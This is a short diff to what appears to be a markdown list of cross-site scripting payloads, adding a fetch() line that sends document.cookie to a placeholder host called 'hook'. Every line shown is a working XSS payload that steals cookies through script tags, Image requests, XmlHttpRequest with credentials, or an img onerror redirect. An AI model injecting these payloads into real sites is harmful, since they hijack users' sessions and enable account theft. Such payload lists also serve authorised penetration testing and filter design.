@@ -15,6 +15,7 @@
   - `<script>var a=new XmlHttpRequest();a.open("GET","https://hook",true);a.withCredentials=true;a.send(null);</script>`
 
 - **Element**
+  - `<script>fetch('http://hook?a='+document.cookie);</script>`
   - `<script>var i=new Image;i.src="https://hook/?"+document.cookie;</script>`
   - `<script>var i=new Image();i.src="https://hook?cookie="+btoa(document.cookie);</script>`
   - `<img src=x onerror="javascript:document.location='https://hook?cookie='+document.cookie;">`
